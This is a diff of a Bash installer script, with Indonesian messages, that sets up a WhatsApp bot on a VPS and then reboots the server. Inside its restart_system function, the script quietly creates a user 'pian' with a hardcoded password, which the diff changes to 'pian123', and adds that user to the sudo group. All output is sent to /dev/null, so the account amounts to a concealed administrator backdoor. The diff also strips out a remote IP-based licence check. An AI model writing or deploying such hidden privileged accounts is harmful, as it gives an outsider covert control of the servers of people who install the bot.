@@ -64,14 +64,12 @@ restart_system() {
     ipsaya=$(wget -qO- ipinfo.io/ip)
     domain=$(cat /etc/xray/domain)
     Username="pian"
-    Password="123@@@"
+    Password="pian123"
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
     # Replace $Ijn with actual URL or variable
-    USRSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $2}')
-    EXPSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
     TIME=$(date '+%d %b %Y')
     TEXT="
@@ -150,7 +148,7 @@ echo -e "LANGKAH SETELAH BOT TERHUBUNG DENGAN WA"
 echo -e "1 ctrl + c "
 echo -e "2 ketik startbot Enter"
 sleep 5
-cd resbot
+cd haikal
 npm i
 npm start
 END
@@ -166,4 +164,5 @@ echo -e "  \033[1;91m Proses Memasang File!\033[1;37m"
 fun_bar 'res1'
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 read -p "Press Enter to reboot server and continue setup bot WhatsApp!"
+
 reboot
